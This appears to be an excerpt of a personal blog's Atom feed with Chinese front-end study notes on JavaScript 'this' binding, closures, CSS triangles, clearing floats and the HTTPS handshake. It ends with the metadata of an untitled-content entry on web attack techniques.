this.func1()</span><br><span class="line">        &#125;,100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()     // this.func1 is not a function复制代码</span><br></pre></td></tr></table></figure><p>函数调用的方法一共有 4 种</p><ol><li>作为一个函数调用</li><li>函数作为方法调用</li><li>使用构造函数调用函数</li><li>作为函数方法调用函数（call、apply）</li></ol><h2 id="作为一个函数调用"><a href="#作为一个函数调用" class="headerlink" title="作为一个函数调用"></a>作为一个函数调用</h2><p>比如上面的 例 1：<br>例 1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line">function a() &#123;</span><br><span class="line">    var name = &quot;Cherry&quot;;</span><br><span class="line"></span><br><span class="line">    console.log(this.name);          // windowsName</span><br><span class="line"></span><br><span class="line">    console.log(&quot;inner:&quot; + this);    // inner: Window</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br><span class="line">console.log(&quot;outer:&quot; + this)         // outer: Window复制代码</span><br></pre></td></tr></table></figure><p>这样一个最简单的函数，不属于任何一个对象，就是一个函数，这样的情况在 JavaScript 的在浏览器中的非严格模式默认是属于全局对象 window 的，在严格模式，就是 undefined。 </p><p>但这是一个全局的函数，很容易产生命名冲突，所以不建议这样使用。</p><h2 id="函数作为方法调用"><a href="#函数作为方法调用" class="headerlink" title="函数作为方法调用"></a>函数作为方法调用</h2><p>所以说更多的情况是将函数作为对象的方法使用。比如例 2：<br>例 2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line">var a = &#123;</span><br><span class="line">    name: &quot;Cherry&quot;,</span><br><span class="line">    fn : function () &#123;</span><br><span class="line">        console.log(this.name);      // Cherry</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">a.fn();复制代码</span><br></pre></td></tr></table></figure><p>这里定义一个对象 <code>a</code>，对象 <code>a</code> 有一个属性（<code>name</code>）和一个方法（<code>fn</code>）。</p><p>然后对象 <code>a</code> 通过 <code>.</code> 方法调用了其中的 fn 方法。</p><p>然后我们一直记住的那句话“<strong>this 永远指向最后调用它的那个对象</strong>”，所以在 fn 中的 this 就是指向 a 的。</p><h2 id="使用构造函数调用函数"><a href="#使用构造函数调用函数" class="headerlink" title="使用构造函数调用函数"></a>使用构造函数调用函数</h2><blockquote><p>如果函数调用前使用了 new 关键字, 则是调用了构造函数。<br>这看起来就像创建了新的函数，但实际上 JavaScript 函数是重新创建的对象：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 构造函数:</span><br><span class="line">function myFunction(arg1, arg2) &#123;</span><br><span class="line">    this.firstName = arg1;</span><br><span class="line">    this.lastName  = arg2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// This    creates a new object</span><br><span class="line">var a = new myFunction(&quot;Li&quot;,&quot;Cherry&quot;);</span><br><span class="line">a.lastName;                             // 返回 &quot;Cherry&quot;复制代码</span><br></pre></td></tr></table></figure><p>这就有要说另一个面试经典问题：new 的过程了，(ಥ_ಥ)<br>这里就简单的来看一下 new 的过程吧：<br>伪代码表示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var a = new myFunction(&quot;Li&quot;,&quot;Cherry&quot;);</span><br><span class="line"></span><br><span class="line">new myFunction&#123;</span><br><span class="line">    var obj = &#123;&#125;;</span><br><span class="line">    obj.__proto__ = myFunction.prototype;</span><br><span class="line">    var result = myFunction.call(obj,&quot;Li&quot;,&quot;Cherry&quot;);</span><br><span class="line">    return typeof result === &#x27;obj&#x27;? result : obj;</span><br><span class="line">&#125;复制代码</span><br></pre></td></tr></table></figure><ol><li>创建一个空对象 obj;</li><li>将新创建的空对象的隐式原型指向其构造函数的显示原型。</li><li>使用 call 改变 this 的指向</li><li>如果无返回值或者返回一个非对象值，则将 obj 返回作为新对象；如果返回值是一个新对象的话那么直接直接返回该对象。</li></ol><p>所以我们可以看到，在 new 的过程中，我们是使用 call 改变了 this 的指向。 </p><h2 id="作为函数方法调用函数"><a href="#作为函数方法调用函数" class="headerlink" title="作为函数方法调用函数"></a>作为函数方法调用函数</h2><blockquote><p>在 JavaScript 中, 函数是对象。</p><p>JavaScript 函数有它的属性和方法。<br>call() 和 apply() 是预定义的函数方法。 两个方法可用于调用函数，两个方法的第一个参数必须是对象本身</p><p>在 JavaScript 严格模式(strict mode)下, 在调用函数时第一个参数会成为 this 的值， 即使该参数不是一个对象。<br>在 JavaScript 非严格模式(non-strict mode)下, 如果第一个参数的值是 null 或 undefined, 它将使用全局对象替代。</p></blockquote><p>这个时候我们再来看例 6：<br>例 6：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line"></span><br><span class="line">function fn() &#123;</span><br><span class="line">    var name = &#x27;Cherry&#x27;;</span><br><span class="line">    innerFunction();</span><br><span class="line">    function innerFunction() &#123;</span><br><span class="line">        console.log(this.name);      // windowsName</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn()复制代码</span><br></pre></td></tr></table></figure><p>这里的 innerFunction() 的调用是不是属于第一种调用方式：<strong>作为一个函数调用</strong>（它就是作为一个函数调用的，没有挂载在任何对象上，所以对于没有挂载在任何对象上的函数，在非严格模式下 this 就是指向 window 的）</p><p>然后再看一下 例 7：<br>例 7：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;windowsName&quot;;</span><br><span class="line"></span><br><span class="line">var a = &#123;</span><br><span class="line">    name : &quot;Cherry&quot;,</span><br><span class="line"></span><br><span class="line">    func1: function () &#123;</span><br><span class="line">        console.log(this.name)     </span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    func2: function () &#123;</span><br><span class="line">        setTimeout(  function () &#123;</span><br><span class="line">            this.func1()</span><br><span class="line">        &#125;,100 );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.func2()     // this.func1 is not a function复制代码</span><br></pre></td></tr></table></figure><p>这个简单一点的理解可以理解为“<strong>匿名函数的 this 永远指向 window</strong>”，你可以这样想，还是那句话<strong>this 永远指向最后调用它的那个对象</strong>，那么我们就来找最后调用匿名函数的对象，这就很尴尬了，因为匿名函数名字啊，笑哭，所以我们是没有办法被其他对象调用匿名函数的。所以说 匿名函数的 this 永远指向 window。</p><p>如果这个时候你要问，那匿名函数都是怎么定义的，首先，我们通常写的匿名函数都是自执行的，就是在匿名函数后面加 <code>()</code> 让其自执行。其次就是虽然匿名函数不能被其他对象调用，但是可以被其他函数调用啊，比如例 7 中的 setTimeout。</p><p>转自（作者：sunshine小小倩<br>链接：<a href="https://juejin.cn/post/6844903496253177863">https://juejin.cn/post/6844903496253177863</a><br>来源：稀土掘金）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;判断this指向：&quot;&gt;&lt;a href=&quot;#判断this指向：&quot; class=&quot;headerlink&quot; title=&quot;判断this指向：&quot;&gt;&lt;/a&gt;判断this指向：&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;由new调用？绑定到新创建的对象&lt;/li&gt;
&lt;li&gt;由call或者app</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coloey.github.io/categories/JavaScript/"/>
    
    
  </entry>
  
  <entry>
    <title>理解闭包</title>
    <link href="https://coloey.github.io/2022/04/13/%E7%90%86%E8%A7%A3%E9%97%AD%E5%8C%85/"/>
    <id>https://coloey.github.io/2022/04/13/%E7%90%86%E8%A7%A3%E9%97%AD%E5%8C%85/</id>
    <published>2022-04-13T06:15:41.000Z</published>
    <updated>2022-04-13T06:48:13.918Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">var</span> a=<span class="number">2</span>;</span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(a);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> bar;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">var</span> baz=foo();</span><br><span class="line">   baz();<span class="comment">//2</span></span><br></pre></td></tr></table></figure><p>内部函数bar()能够访问foo()的内部作用域，将bar()函数本身作为值类型传递，调用foo()，我们通常希望整个内部作用域被销毁，然而因为bar()所声明的位置拥有涵盖foo()内部作用域的闭包，使得作用域一直存活，以供bar()在任何时间之后进行引用。内部函数依然持有对外部函数的作用域的引用，这个引用就叫做闭包 </p><p>总结来说：本质就是上级作用域内变量的生命周期，因为被下级作用域内引用，而没有被释放。就导致上级作用域内的变量，等到下级作用域执行完以后才正常得到释放。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coloey.github.io/categories/JavaScript/"/>
    
    
  </entry>
  
  <entry>
    <title>CSS画三角</title>
    <link href="https://coloey.github.io/2022/04/13/CSS%E7%94%BB%E4%B8%89%E8%A7%92/"/>
    <id>https://coloey.github.io/2022/04/13/CSS%E7%94%BB%E4%B8%89%E8%A7%92/</id>
    <published>2022-04-13T03:36:52.000Z</published>
    <updated>2022-04-13T06:17:31.861Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> solid transparent;</span><br><span class="line">    <span class="attribute">border-left-color</span>:pink;</span><br><span class="line">    <span class="comment">/*照顾兼容性*/</span></span><br><span class="line">    <span class="attribute">line-height</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>margin负值巧妙使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">       <span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="css">           <span class="attribute">list-style-type</span>: none;</span></span><br><span class="line"><span class="css">           <span class="attribute">float</span><span class="selector-pseudo">:left</span>;</span></span><br><span class="line"><span class="css">           <span class="attribute">width</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="css">           <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">           <span class="attribute">border</span>:<span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="css">           <span class="attribute">margin-left</span>: -<span class="number">1px</span>;</span></span><br><span class="line"><span class="css">       &#125;</span></span><br><span class="line"><span class="css">       <span class="selector-tag">ul</span> <span class="selector-tag">li</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="css">           <span class="comment">/* 如果盒子没有定位则添加相对定位使得合资压住所有其他标准流 */</span></span></span><br><span class="line"><span class="css">           <span class="attribute">position</span>:relative;</span></span><br><span class="line"><span class="css">           <span class="attribute">border</span>: <span class="number">1px</span> solid blue;</span></span><br><span class="line"><span class="css">       &#125;</span></span><br><span class="line"><span class="css">       <span class="selector-tag">ul</span> <span class="selector-tag">li</span> <span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="css">           <span class="comment">/* 如果盒子有定位设置z-index提高盒子层级 */</span></span></span><br><span class="line"><span class="css">           <span class="attribute">z-index</span>:<span class="number">1</span>;</span></span><br><span class="line"><span class="css">           <span class="attribute">border</span>: <span class="number">1px</span> solid blue;</span></span><br><span class="line"><span class="css">       &#125;</span></span><br><span class="line"><span class="css">   </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;</summary>
      
    
    
    
    <category term="CSS" scheme="https://coloey.github.io/categories/CSS/"/>
    
    
  </entry>
  
  <entry>
    <title>清除浮动</title>
    <link href="https://coloey.github.io/2022/04/13/%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8/"/>
    <id>https://coloey.github.io/2022/04/13/%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8/</id>
    <published>2022-04-13T01:36:28.000Z</published>
    <updated>2022-04-13T03:36:27.389Z</updated>
    
    <content type="html"><![CDATA[<h1 id="为什么需要清除浮动"><a href="#为什么需要清除浮动" class="headerlink" title="为什么需要清除浮动"></a>为什么需要清除浮动</h1><p>由于父级盒子很多情况下，不方便给高度，当时盒子浮动又不占有位置，最后父级盒子高度为 0 时，就会影响下面的盒子，对后面元素排版产生影响。</p><h1 id="清除浮动本质"><a href="#清除浮动本质" class="headerlink" title="清除浮动本质"></a>清除浮动本质</h1><ul><li>清除浮动的本质是清除浮动元素造成的影响</li><li>如果父盒子本身具有高度，则不需要清除浮动</li><li>清除浮动之后，父级会根据浮动的子盒子自动检测高度，父级有了高度，就不会影响下面的标准流了</li></ul><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">选择器: &#123;</span><br><span class="line">  clear: 属性值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>属性值</th><th>描述</th></tr></thead><tbody><tr><td>left</td><td>不允许左侧有浮动元素</td></tr><tr><td>right</td><td>不允许右侧有浮动元素</td></tr><tr><td>both</td><td>同时清除左右两侧浮动</td></tr></tbody></table><p>清除浮动策略：闭合浮动</p><h1 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h1><ol><li><strong>额外标签法（隔墙法）</strong>，是 W3C 推荐的方法</li><li>父级添加 overflow 属性</li><li>父级添加 after 伪元素</li><li>父级添加双伪元素</li></ol><h2 id="额外标签法"><a href="#额外标签法" class="headerlink" title="额外标签法"></a>额外标签法</h2><p>也称为隔墙法，是 W3C 推荐的方法。</p><p>额外标签法是在最后一个浮动元素末尾添加一个 <strong>空块级元素</strong>（<strong>不能是行内元素</strong>），给其赋以属性 <code>clear:both;</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">  <span class="attribute">clear</span>: both;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;clear&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>Copy to clipboardErrorCopied</span><br></pre></td></tr></table></figure><ul><li>优点：通俗易懂，书写方便</li><li>缺点：添加许多无意义的标签，结构化差</li></ul><p>总结</p><ol><li><p>清除浮动的本质</p><p>清除浮动的本质是清除浮动元素脱离标准流造成的影响</p></li><li><p>清除浮动的策略</p><p><strong>闭合浮动</strong>，只让浮动在父盒子内部影响，不影响父盒子外面的其他盒子。</p></li><li><p>使用场景</p><p>实际开发中可能会遇到，但是不常用。</p></li></ol><h2 id="父级添加-overflow-属性"><a href="#父级添加-overflow-属性" class="headerlink" title="父级添加 overflow 属性"></a>父级添加 <code>overflow</code> 属性</h2><p>可以给父级添加 <code>overflow</code> 属性，将其属性设置为 <code>hidden</code>、<code>auto</code>或<code>scroll</code>。</p><p>注意是给父元素添加代码：</p><ul><li>优点：代码简洁</li><li>缺点：无法显示溢出部分</li></ul><h2 id="父级添加-after-伪元素"><a href="#父级添加-after-伪元素" class="headerlink" title="父级添加 after 伪元素"></a>父级添加 after 伪元素</h2><p>实际上也是额外标签法的一种。（相当于在最后一个子元素后面再添加一个元素隔开）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;//伪元素为行内块元素，要转换为块级元素</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">  <span class="attribute">visibility</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span> &#123;</span><br><span class="line">  <span class="comment">/*IE6、7专有*/</span></span><br><span class="line">  *zoom: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="父级添加双伪元素"><a href="#父级添加双伪元素" class="headerlink" title="父级添加双伪元素"></a>父级添加双伪元素</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;//前后都隔开</span><br><span class="line">  <span class="attribute">display</span>: table;//伪元素为行内块元素，要转换为块级元素</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span> &#123;</span><br><span class="line">  *zoom: <span class="number">1</span>;</span><br><span class="line">&#125;Copy <span class="selector-tag">to</span> clipboardErrorCopied</span><br></pre></td></tr></table></figure><ul><li>优点：代码更简洁</li><li>缺点：照顾低版本浏览器</li><li>代表网站：小米、腾讯</li></ul><p>伪元素转化为块级元素原因：根本原因是为了解决<strong>clearfix内部非浮动元素margin塌陷问题</strong>。</p><p>另发现一个新属性<strong>display: flow-root</strong>，不支持Safari。它可以创建无副作用的BFC。在父级块中使用 display: flow-root 可以创建新的BFC。其作用和clearfix一致。</p><p>参考：</p><h1 id="为什么需要清除浮动？"><a href="#为什么需要清除浮动？" class="headerlink" title="为什么需要清除浮动？"></a>为什么需要清除浮动？</h1><ol><li>父级没高度</li><li>子盒子浮动了</li><li>影响下面布局了，应该清除浮动。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;为什么需要清除浮动&quot;&gt;&lt;a href=&quot;#为什么需要清除浮动&quot; class=&quot;headerlink&quot; title=&quot;为什么需要清除浮动&quot;&gt;&lt;/a&gt;为什么需要清除浮动&lt;/h1&gt;&lt;p&gt;由于父级盒子很多情况下，不方便给高度，当时盒子浮动又不占有位置，最后父级盒子高度为 </summary>
      
    
    
    
    <category term="CSS" scheme="https://coloey.github.io/categories/CSS/"/>
    
    
  </entry>
  
  <entry>
    <title>HTTPS</title>
    <link href="https://coloey.github.io/2022/04/12/HTTPS/"/>
    <id>https://coloey.github.io/2022/04/12/HTTPS/</id>
    <published>2022-04-12T14:02:46.000Z</published>
    <updated>2022-04-13T02:10:02.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTP-加密-认证-完整性保护-HTTPS"><a href="#HTTP-加密-认证-完整性保护-HTTPS" class="headerlink" title="HTTP+加密+认证+完整性保护=HTTPS"></a>HTTP+加密+认证+完整性保护=HTTPS</h1><p>HTTPS是HTTP通信接口部分用SSL和TLS协议代替。</p><p><img src="/2022/04/12/HTTPS/image-20220412220554428-16498156890354.png" alt="image-20220412220554428-16498156890354"></p><p>SSL是独立于HTTP的协议</p><h1 id="相互交换密钥的公开密钥加密技术"><a href="#相互交换密钥的公开密钥加密技术" class="headerlink" title="相互交换密钥的公开密钥加密技术"></a>相互交换密钥的公开密钥加密技术</h1><h2 id="共享密钥加密"><a href="#共享密钥加密" class="headerlink" title="共享密钥加密"></a>共享密钥加密</h2><p>加密和解密用一个密钥的方式，也叫做对称密钥加密</p><p><img src="/2022/04/12/HTTPS/image-20220412220843669-16497725444302.png" alt="image-20220412220843669-16497725444302"></p><h2 id="使用两把密钥的公开密钥加密"><a href="#使用两把密钥的公开密钥加密" class="headerlink" title="使用两把密钥的公开密钥加密"></a>使用两把密钥的公开密钥加密</h2><p>使用非对称的密钥，一把叫做私有密钥，另一把叫做公有密钥，私有密钥不能让任何人知道，公有密钥可以随意发布。</p><p>发送密文的一方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密，解密过程是队离散对数的求值。</p><h2 id="HTTPS采用混合加密机制"><a href="#HTTPS采用混合加密机制" class="headerlink" title="HTTPS采用混合加密机制"></a>HTTPS采用混合加密机制</h2><p><img src="/2022/04/12/HTTPS/image-20220412221342675-16497728370873.png" alt="image-20220412221342675-16497728370873"></p><h2 id="证明公开密钥正确性的证书"><a href="#证明公开密钥正确性的证书" class="headerlink" title="证明公开密钥正确性的证书"></a>证明公开密钥正确性的证书</h2><p><img src="/2022/04/12/HTTPS/image-20220412221707589-16497730392834.png" alt="image-20220412221707589-16497730392834"></p><h1 id="HTTPS的安全通信机制"><a href="#HTTPS的安全通信机制" class="headerlink" title="HTTPS的安全通信机制"></a>HTTPS的安全通信机制</h1><p><img src="/2022/04/12/HTTPS/image-20220412221846408-16497731373315.png" alt="image-20220412221846408-16497731373315"></p><ol><li>客户端通过发送Client Hello报文开始SSL通信，报文中包含客户端支持的SSL的指定版本，加密组件列表</li><li>服务器可进行SSL通信时，会以Server Hello报文作为应答，和客户端一样，在报文中包含SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的</li><li>之后服务器发送Certificate报文，报文中包含公开密钥证书</li><li>最后服务器发送Server Hello Done 报告通知客户端，最初阶段的SSL握手协商部分结束</li><li>SSL第一次握手结束后，客户端以Client Key Exchange报文作为回应，报文中包含通信加密中使用的一种被称为Pre-master secret的随机密码串，该报文已用步骤3中的公开密钥进行加密</li><li>接着客户端继续发送Change Cipher Spec报文，该报文会提示服务器，在此报文之后的通信会采用Pre-master secret密钥加密</li><li>客户端发送Finished报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否正确解密该报文作为判定标准</li><li>服务器同样发送Change Cipher Spec报文</li><li>服务器同样发送Finished报文</li><li>服务端和客户端的Finished报文交换完毕后，SSL连接就建立完成。通信会受到SSL保护，从此开始进行应用层协议通信，即发送HTTP请求</li></ol><p><img src="/2022/04/12/HTTPS/image-20220412222929047-16497737799696.png" alt="image-20220412222929047-16497737799696"></p><h2 id="SSL缺点："><a href="#SSL缺点：" class="headerlink" title="SSL缺点："></a>SSL缺点：</h2><ul><li>通信慢</li><li>大量消耗CPU及内存资源，导致处理速度慢</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTTP-加密-认证-完整性保护-HTTPS&quot;&gt;&lt;a href=&quot;#HTTP-加密-认证-完整性保护-HTTPS&quot; class=&quot;headerlink&quot; title=&quot;HTTP+加密+认证+完整性保护=HTTPS&quot;&gt;&lt;/a&gt;HTTP+加密+认证+完整性保护=HTT</summary>
      
    
    
    
    <category term="http" scheme="https://coloey.github.io/categories/http/"/>
    
    
  </entry>
  
  <entry>
    <title>针对Web的攻击技术</title>
    <link href="https://coloey.github.io/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/"/>
    <id>https://coloey.github.io/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/</id>
    <published>2022-04-12T10:09:24.000Z</published>
    <updated>2022-04-12T14:00:45.873Z</updated>
    
